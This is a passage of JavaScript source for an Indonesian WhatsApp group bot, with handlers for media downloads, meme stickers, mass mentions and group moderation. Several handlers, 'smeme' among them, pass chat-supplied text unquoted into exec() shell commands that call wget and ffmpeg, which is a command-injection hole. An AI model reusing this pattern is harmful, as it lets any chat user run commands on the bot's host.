            
            case 'tiktok':        
                     if (args.length < 1) return setReply('Link?')
                     if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
                     lin = args[0]
                     setReply(mess.wait)
                     hx.ttdownloader(lin).then(res => {
                     console.log('[ T I K T O K ] downloader')
                     ep = res.wm                     
                     sendFileFromUrl(ep, video, {quoted: dev, caption: "Nih"})
                      })
                      break
                      
                      case 'infogempa':
                      try{
        data = await fetchJson("https://arugaz.herokuapp.com/api/infogempa")
        bujur = data.koordinat.replace(/[BT|LS]/gi, '')
teks =`*Info Gempa*  
Kedalaman : ${data.kedalaman}
Koordinat : ${data.koordinat}
Lokasi : ${data.lokasi}
Waktu : ${data.waktu}
Magnitude : ${data.magnitude}
Potensi : ${data.potensi}`
map = data.map
sendFileFromUrl(map, image, {quoted: dev, caption: teks})
 /*
await xdev.sendMessage(from, {
degreesLatitude: data.koordinat.split(" ")[0],
degreesLongitude: bujur.split("-")[1],
name: "Lokasi terjadinya gempa",
address: "Blom ada" 
}, location, {contextInfo: forward })
*/

} catch (err) {
setReply(err)
}                           
break
                      
                      
                      
                      
                      
                      
                   



   
                      case 'tiktoknowm':     
                     try{   
                     if (args.length < 1) return setReply('Link?')
                     if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply(aml.Iv)
                     lin = args[0]
                     setReply(mess.wait)
                     hx.ttdownloader(lin).then(res => {
                     console.log('[ T I K T O K ] downloader')
                     ep = res.nowm                     
                     sendFileFromUrl(ep, video, {quoted: dev, caption: "Nih"})
                      })
                      } catch (err){
                      	setReply(err)
                      }
                      break
                      
                      
	
case 'ig':

setReply(mess.wait)
if (!q) return setReply('Linknya?')
var { igDownloader } = require('./lib/igdown')
   res = await igDownloader(`${q}`).catch(e => {
return setReply(mess.error.api)
})
console.log(res)
sendFileFromUrl(`${res.result.link}`, video, {quoted: dev, caption: `${res.result.desc}`})
                    break
                   
                   

   
   

        
	
    case 'igstalk':
		try{
		            if (!q) return fakegroup('Usernamenya?')
		            ig.fetchUser(`${args.join(' ')}`).then(Y => {
		            console.log(`${args.join(' ')}`)
		            ten = `${Y.profile_pic_url_hd}`
		            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.following}\n*Following* : ${Y.followers}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
		            sendMediaURL(from,ten,teks) 
		            })} catch (err){
			console.log(err)
			setReply("Aduh error om")
			}
        break;      
	
	
            
        
            
                   
                   
      
            
            
            
		
		
		
		
		
            
case 'wanted':
case 'utatoo':
case 'unsharpen':
case 'thanos':
case 'sniper':
case 'sharpen':
case 'sepia':
case 'scary':
case 'rip':
case 'redple':
case 'rejected':
case 'posterize':
case 'ps4':
case 'pixelize':
case 'missionpassed':
case 'moustache':
case 'lookwhatkarenhave':
case 'jail':
case 'invert':
case 'instagram':
case 'greyscale':
case 'glitch':
case 'gay':
case 'frame':
case 'fire':
case 'distort':
case 'dictator':
case 'deepfry':
case 'ddungeon':
case 'circle':
case 'challenger':
case 'burn':
case 'brazzers':
case 'beautiful':
if (isQuotedImage) {
setReply(mess.wait)
bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delib = await xdev.downloadMediaMessage(bioij)
datau = await upload(delib)  
ini_gen = `${command}`
console.log(color(ini_gen))
ameApi.generate(ini_gen, {
url : datau
}).then(gambar => {
xdev.sendMessage(from, gambar, image, {quoted: dev, caption: "Nih"})
fs.unlinkSync(delib)
}).catch(err => {
throw err;
});  
} else if (isQuotedTag || isQuotedReply) {
setReply(mess.wait)
ghost = dev.message.extendedTextMessage.contextInfo.participant || dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
oppp = await xdev.getProfilePicture(ghost).catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
datae = await imageToBase64(JSON.stringify(oppp).replace(/\"/gi, ''))
fs.writeFileSync('janckuk.jpeg', datae, 'base64')
anuk = await upload(fs.readFileSync('./janckuk.jpeg'))
ini_gen = `${command}`
console.log(color(ini_gen))
ameApi.generate(ini_gen, {
url : anuk
}).then(gambar => {
xdev.sendMessage(from, gambar, image, {quoted: dev, caption: "Nih"})
fs.unlinkSync('./janckuk.jpeg')
}).catch(err => {
throw err;
});    
} else {
setReply("Tag atau Reply targetnya")
}
break
            
           
            
            
                                                                                
                                                                                                        
                                                                                                                    
            
            
            
            
            
            
	case 'smeme': case 'stickmeme': case 'sm': 
	      if(!q) return setReply(`Masukan teks, contoh : ${prefix}smeme teks|teks`)
       var top = q.split('|')[0] ? q.split('|')[0] : ''
        var bottom = q.split('|')[1] ? q.split('|')[1] : ''
           
if ((isMedia && !dev.message.videoMessage || isQuotedImage ) && args.length >= 0) {
	ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
	setReply(mess.wait)
	olalah = await xdev.downloadMediaMessage(ger)
	anuah = await upload(olalah)
            ranp = getRandom('.gif')
            rano = getRandom('.webp')
           anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
           exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
       	fs.unlinkSync(ranp)
	       if (err) return setReply(err)
           xdev.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: dev})
		   fs.unlinkSync(rano)
		 //  fs.unlinkSync(owgi)
		   })
		   } else {
           setReply('Gunakan foto!')
           }
           break



case 'triggered':
					if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
					setReply(mess.wait)
					owgi = await xdev.downloadMediaMessage(ger)
				    anu = await upload(owgi)
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${anu}`
					exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					 if (err) return setReply(err)
					xdev.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: dev})
					fs.unlinkSync(rano)
					
					})
					} else {
					setReply('Gunakan foto!')
					}
					break 
    
    
    
    case 'wasted':
            if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            setReply(mess.wait)       
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            owgi = await xdev.downloadMediaMessage(boij)
            res = await upload(owgi)
            ranp = getRandom('.gif')
            rano = getRandom('.webp')
            anu2 = `https://some-random-api.ml/canvas/wasted?avatar=${res}`
            exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
            fs.unlinkSync(ranp)
            if (err) return setReply(err)
            nobg = fs.readFileSync(rano)
            xdev.sendMessage(from, nobg, sticker, {quoted: dev})
            fs.unlinkSync(rano)
            
            	})
            } else {
            setReply('kirim/reply gambar/video')
            }
            break	
    
    
	
	
	
	
	
	
	
            
    case 'totag':
    if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return setReply(mess.admin)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          setReply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
	
	
	case 'hidetag':
	if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
  if(isExtream) return
			if (!dev.key.fromMe & !isGroupAdmins) return setReply(mess.admin)
			if (!isGroup) return setReply(mess.only.group)
			var value = args.join(' ')
			var group = await xdev.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: dev
			}
			xdev.sendMessage(from, optionshidetag, text)
			break
	
	case 'asupan':
	if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
           const rows5 = [{
        "title": 'rikagusriani',
        "rowId": '0'
    }, {
        "title": 'ukhty',
        "rowId": '0'
    }, {
        "title": 'santuy',
        "rowId": '0'
    }, {
        "title": 'geayubi',
        "rowId": '0'
    }, {
        "title": 'bocil',
        "rowId": '0'
    }, {
        "title": 'asupan',
        "rowId": '0'
    }, {
        "title": 'chika',
        "rowId": '0'
    }, {
        "title": 'delvira',
        "rowId": '0'
    }, {
        "title": 'ayu',
        "rowId": '0'
    }, {
        "title": 'bunga',
        "rowId": '0'
    }, {
        "title": 'aura',
        "rowId": '0'
    }, {
        "title": 'nisa',
        "rowId": '0'
    }, {
        "title": 'ziva',
        "rowId": '0'
    }, {
        "title": 'yana',
        "rowId": '0'
    }, {
        "title": 'viona',
        "rowId": '0'
    }, {
        "title": 'syania',
        "rowId": '0'
    }, {
        "title": 'riri',
        "rowId": '0'
    }, {
        "title": 'syifa',
        "rowId": '0'
    }, {
        "title": 'mama_gina',
        "rowId": '0'
    }, {
        "title": 'alcakenya',
        "rowId": '0'
    }, {
        "title": 'mangayutri',
        "rowId": '0'
    }];
    const sections5 = [{
        title: 'Pilih salah satu',
        rows: rows5
    }];
    const listt5 = {
        buttonText: 'SELECT HERE',
        title: `ASUPAN MENU`,
        description: `Hai kak ${pushname} Semoga harimu menyenangkan 😇`,
        footerText: `Botz its Upgraded`,
        sections: sections5,
        listType: 1
    };
    xdev.sendMessage(from, listt5, MessageType.listMessage, {
        contextInfo: {
            "mentionedJid": [sender]
        }
    })
break

           
	
	
	
	
	
	case 'ytdl':
    case 'youtubedl': 
        if (!isPremium && !isOwner && !dev.key.fromMe) return setReply(`Kamu bukan user premium`)
             if (args.length < 1) return setReply('Link Nya Mana?')
             if(!isUrl(args[0]) && !args[0].includes('youtu')) return setReply('aduh error')
             teks = args.join(' ')
             res = await y2mateA(teks).catch(e => {
             setReply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
})
             result = `*Youtube Downloader*
             
📜 Title : ${res[0].judul}
🎁 Type : mp3/mp4
⚖️ File : ${res[0].size}`
             
              fs.writeFileSync(`./ytmp.jpeg`, await getBuffer(res[0].thumb))
              
              imageMsg = ( await xdev.prepareMessage(from, fs.readFileSync(`./ytmp.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
             
              gbutsan = [
  {buttonId: `${prefix}buttons2 ${q}`,buttonText:{displayText: `▶️ Video`},type:1},
  {buttonId:`${prefix}buttons1 ${q}`, buttonText: {displayText:`🎵Audio`},type:1}
]
             
              gbuttonan = {
imageMessage: imageMsg,
    contentText:`${result}`,
    footerText:'Pilih satu format di bawah ini',
    buttons: gbutsan,
    headerType: 4
    }
  await xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
            quoted: setQuoted, contextInfo: forward})
              fs.unlinkSync(`./ytmp.jpeg`)
              break
	
	
	
	
	
	
	
	
	
	
                       


           
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
  //-------------------------------》FITUR GROUP《-------------------------------\\       
    
    
    
    
       case 'simi':              
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (!isGroup) return setReply('hanya bisa di group')
						if (isSimi) return setReply('Fitur sudah aktif kak')
						siminya.push(from);
						//fs.writeFileSync("./database/simi.json", JSON.stringify(siminya))
						let ih =`Fitur simi telah di aktifkan di group ini, ketik silakan ketik ${prefix}halo`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isGroup) return setReply('hanya bisa di group')
						if (!isSimi) return setReply('Udah mati')
						siminya.splice(from, 1);
						//fs.writeFileSync("./database/simi.json", JSON.stringify(siminya))
						let ih =`Fitur simi telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE SIMI SIMI`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}simi on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}simi off`, buttonText: { displayText: Off },type: 1}]);
                    } else {  
       if(isSimi) return   
	   simi = await fetchJson(`https://api.simsimi.net/v2/?text=${q}&lc=id`)
       sami = simi.success
       setReply(sami) 
       }
       break
             
             
    
    
    
case 'linkgc':
case 'linkgrup':
case 'linkgrop':
case 'linkgroup':
if (!isGroup) return
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
linkgc = await xdev.groupInviteCode(from)
yeh = `*「 Link Group 」*\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n\n_yo bisa yo ramein_`
xdev.sendMessage(from, yeh, text, { quoted: dev })
break

case 'gc':
case 'group':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
 if (!q) {
               sendButMessage(from, `GRUP SETTING`, `Silahkan pilih salah satu`, [
                 {buttonId: `${prefix}group open`, buttonText: {displayText: `OPEN`,},type: 1},
                 {buttonId: `${prefix}group close`, buttonText: {displayText: `CLOSE`,},type: 1},
                  {buttonId: `${prefix}revoke`, buttonText: { displayText: `REVOKE`,},type: 1}]);
                    }
if (args[0] === 'open') {

await  xdev.groupSettingChange(from, GroupSettingChange.messageSend, false)
await setReply('_Success_')
} else if (args[0] === 'close') {
 await xdev.groupSettingChange(from, GroupSettingChange.messageSend, true)
await setReply('_Success_')
}
                 break;


case 'setdesc':
case 'setdesk':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if(!q) return setReply("Teksnya apa")
xdev.groupUpdateDescription(from, q)
setReply("Succes")
break

case 'setnamegc':
{
if(!q) return setReply("masukin teksnya kak")
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
await xdev.groupUpdateSubject(from, `${args.join(" ")}`)
await xdev.sendMessage(from, 'Succes change name group', text, {quoted:dev})
}
break





	case 'unadmin':
	case 'demote':
	if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}promote Tag/Reply/input nomer`)       
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
nomor = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
xdev.groupDemoteAdmin(from, [nomor])
teks = `Members @${nomor.split('@')[0]} succes demote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[nomor]}})

} else if (dev.message.extendedTextMessage.contextInfo.participant) {
premnih = dev.message.extendedTextMessage.contextInfo.participant
if (!isGroup) return setReply("Hanya bisa di group")
xdev.groupDemoteAdmin(from, [premnih])
teks = `Members @${premnih.split('@')[0]} succes demote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[premnih]}})

 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
xdev.groupDemoteAdmin(from, [lulu])
teks = `Members @${lulu.split('@')[0]} succes demote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[lulu]}})
   } else{
 setReply(`Kirim perintah ${prefix}promote tag atau input nomor atau reply pesan orang yang ingin di promote`)
 }
break    










case 'admin':
	case 'promote':
	if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}promote Tag/Reply/input nomer`)       
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
nomor = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
xdev.groupMakeAdmin(from, [nomor])
teks = `Members @${nomor.split('@')[0]} succes promote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[nomor]}})

} else if (dev.message.extendedTextMessage.contextInfo.participant) {
premnih = dev.message.extendedTextMessage.contextInfo.participant
if (!isGroup) return setReply("Hanya bisa di group")
xdev.groupMakeAdmin(from, [premnih])
teks = `Members @${premnih.split('@')[0]} succes promote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[premnih]}})

 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
xdev.groupMakeAdmin(from, [lulu])
teks = `Members @${lulu.split('@')[0]} succes promote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[lulu]}})
   } else{
 setReply(`Kirim perintah ${prefix}promote tag atau input nomor atau reply pesan orang yang ingin di promote`)
 }
break    
	






case 'revoke':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
await xdev.revokeInvite(from)
await setReply('_Success_')
break

    
    
    case "antihidetag":
        if (!isGroup) return setReply("Khusus di grup");
        if (!isGroupAdmins) return sendSticker(hanyaadmin)
		if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
		if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
          if (isAntihidetag) return setReply("Sudah aktif!!");
          addDataId(from, command, DataId)
          setReply("Sukses mengaktifkan antihidetag!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
          removeDataId (command, from, DataId)
          setReply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
					
					
					
					
					
					case 'antivo':
					if (!isGroupAdmins) return sendSticker(hanyaadmin)
					     if(isExtream) return
					if (!isGroup) return setReply('hanya bisa di group')
					if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
          if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
          
          if (isAntiviewonce) return setReply("Sudah aktif!!");
          addDataId(from, command, DataId)
          setReply("Sukses mengaktifkan antiviewonce!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
           
          if (!isAntiviewonce) return setReply("Sudah mati!!");       
          removeDataId (command, from, DataId)
          setReply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTI VIEW ONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antivo on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antivo off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
					
					
					
					
    
case 'kick1':
case 'kicktime':
					if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return setReply('Reply targetnya kak')
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`*Ya jangan lebih dari satu dong kak ${pushname} nanti aku kena banned* 😒`)
if (mentioned.length < 1) {
asu = dev.message.extendedTextMessage.contextInfo.participant
if(dev.message.extendedTextMessage === ownerNumber[0]) return setReply('Tidak bisa kick owner')
aw =fs.readFileSync('./sticker/bismilah.webp')
                   setTimeout( () => {
                   sendSticker1(aw)
                     }, 10000)
                   setTimeout( () => {
					xdev.sendMessage(from, 'Yok sama" Al-fatihah 😁', text)
					}, 8000)
					setTimeout( () => {
					setReply('Sukses kak 😆')
					}, 7000)
					setTimeout( () => {
					xdev.groupRemove(from, [asu])
					}, 6000)
					setTimeout( () => {
					xdev.sendMessage(from, `Bismilah Kick`, text) // ur cods
					}, 5000)
					setTimeout( () => {
					xdev.sendMessage(from, 'Asekk dapet dapet jatah kick 😋', text)
					}, 2500)
					setTimeout( () => {
					setReply('Perintah diterima kak 😃')
					}, 0)
					} else {
                   if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
                    if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa kick owner group`)
                    uw =fs.readFileSync('./sticker/bismilah.webp')
                   setTimeout( () => {
                   sendSticker1(uw)
                     }, 10000)
                   setTimeout( () => {
					xdev.sendMessage(from, 'Yok sama" Al-fatihah ??', text)
					}, 8000)
					setTimeout( () => {
					setReply('Sukses kak 😆')
					}, 7000)
					setTimeout( () => {
					 xdev.groupRemove(from, [mentioned[0]])
					}, 6000)
					setTimeout( () => {
					xdev.sendMessage(from, `Bismilah Kick`, text) // ur cods
					}, 5000)
					setTimeout( () => {
					xdev.sendMessage(from, 'Asekk dapet dapet jatah kick ??', text)
					}, 2500)
					setTimeout( () => {
					setReply('Perintah diterima kak 😃')
					}, 0)
                    }
                     break    
					
					
					
					
					
					case 'kickme':
					try{
					if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
await xdev.groupRemove(from, [sender])
await setReply("Done wkwkw")
} catch (err){
	setReply(err)
	}
break
					


    
    case 'kick':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}kick Tag/Reply/input nomer`)       
if (args[0] == '08') return setReply('Awali nomor dengan 62')  
if (args[0] == botNumber) return setReply('Kunaon siah main kick2 aing, aing teh macan')  
woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke === ownerNumber[0]) return setReply("Ga mau")
await setReply(`Asek asek jatah kick euy 😋`);
await xdev.groupRemove(from, [woke])
    
} else if (mentionByReply) {
if (!isGroup) return setReply("Hanya bisa di group")
Nomer =`${mentionByReply.split("@")[0]}@s.whatsapp.net`
if(Nomer === ownerNumber[0]) return setReply("Ga mau")
if(Nomer === botNumber) return setReply('Kunaon siah main kick2 aing, aing teh macan')  
await setReply( `Modar kena kick awokawok 🤣`);
await xdev.groupRemove(from, [mentionByReply])
    
 } else if(mentionByTag.length == 1) { 
if (mentionByTag.length > 1) return setReply(`Satu satu dong`)
if (mentionByTag.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
if(mentionByTag[0].split("@")[0] + '@s.whatsapp.net' === botNumber) return setReply('Kunaon siah main kick2 aing, aing teh macan')  
if (mentionByTag.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa kick owner group`)
await setReply(`Asek dapet jatah kick, Otw kick 😋`);
await xdev.groupRemove(from, [mentionByTag[0]])
   } else{
 setReply(`Kirim perintah ${prefix}kick @tag atau nomor atau reply pesan orang yang ingin di kick`)
 }
break    


case 'add':
try{
					if (!isGroup) return setReply(mess.only.group)
					if (!isGroupAdmins) return sendSticker(hanyaadmin)
			        if (!isBotGroupAdmins) return sendSticker(jadiinadmin)     
					if ( dev.message.extendedTextMessage === null) {
					if(!q) return setReply("Reply atau input nomer target")
                  	if (args[0] == '08') return setReply('Awali nomor dengan 62')
					  woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
											response = await xdev.groupAdd(from, [woke])
											o = response.participants[0]
											let inv = (Object.values(o))
											if(inv[0].code == 409) return setReply('Target Sudah Di Didalam Group!')
											if(inv[0].code == 403) return setReply('Eror, user private acc')
											if(inv[0].code == 408) return setReply(`Gagal menambah kan doi dengan alasan: *Dia baru keluar group baru-baru ini*`)
											if(inv[0].code == 401) return setReply(`Gagal menambah kan doi dengan alasan: *Bot di block oleh yang bersangkutan*`)
						await xdev.sendMessage(from,`Berhasil menambahkan ${q} ke dalam group ${groupName}`,text);          
						} else if (mentionByReply) {
if (!isGroup) return setReply("Hanya bisa di group")
													response = await xdev.groupAdd(from, [mentionByReply])
													o = response.participants[0]
													let inv = (Object.values(o))
													if(inv[0].code == 409) return setReply('Target Sudah Di Didalam Group!')
													if(inv[0].code == 403) return setReply('Gagal, Karena Di Private')
													if(inv[0].code == 408) return setReply(`Gagal menambah kan doi dengan alasan: *Dia baru keluar group baru-baru ini*`)
													if(inv[0].code == 401) return setReply(`Gagal menambah kan doi dengan alasan: *Bot di block oleh yang bersangkutan*`)
                      await xdev.sendMessage(from,`Berhasil menambahkan @${mentionByReply.split("@")[0]} ke dalam group ${groupName}`,text, {quoted: setQuoted});          
                      } else{
						setReply("Reply atau input nomer target")
						}
						} catch (err){
						console.log(err)
						setReply("Terjadi Error, Tolong input nomer dengan benar")
							}
					break






case 'block':
	if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}kick Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}kick +62xxx 1h`)       
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke === ownerNumber[0]) return setReply("Ga mau")
await xdev.blockUser(woke, "add")
await addBlock(woke, blocked)
await setReply( `Sukses block ${woke.split("@")[0]}`);
    
} else if (dev.message.extendedTextMessage.contextInfo.participant) {
if (!isGroup) return setReply("Hanya bisa di group")
asu = dev.message.extendedTextMessage.contextInfo.participant
Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
